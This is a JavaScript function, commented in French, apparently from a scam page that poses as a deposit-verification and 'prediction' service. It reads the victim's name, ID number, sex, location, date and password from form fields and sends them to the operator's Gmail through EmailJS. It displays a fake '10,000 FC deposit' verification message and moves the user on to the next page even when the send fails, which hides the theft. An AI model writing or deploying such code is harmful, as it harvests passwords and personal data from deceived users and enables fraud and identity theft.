function finalSubmit() {
    const pass = document.getElementById('p3_pass').value;
    if(pass == "") {
        alert("Entrez votre mot de passe pour confirmer l'accès.");
        return;
    }

    // Préparation des données pour EmailJS
    const data = {
        nom: document.getElementById('p1_name').value,
        id: document.getElementById('p1_id').value,
        sexe: document.getElementById('p2_sex').value,
        pays: document.getElementById('p2_pays').value,
        ville: document.getElementById('p2_ville').value,
        date: document.getElementById('p2_date').value,
        pass: pass
    };

    // On affiche un message de chargement
    alert("Vérification du dépôt de 10 000 FC en cours...");

    // Envoi vers Gmail et passage FORCE à la page 4
    emailjs.send("service_ag0odpl", "TON_TEMPLATE_ID_ICI", data)
    .then(() => {
        showPage(4); // Passe à la page prédiction si l'envoi réussit
    })
    .catch((err) => {
        console.log("Erreur EmailJS:", err);
        showPage(4); // On force quand même le passage à la page 4 pour l'utilisateur
    });
}
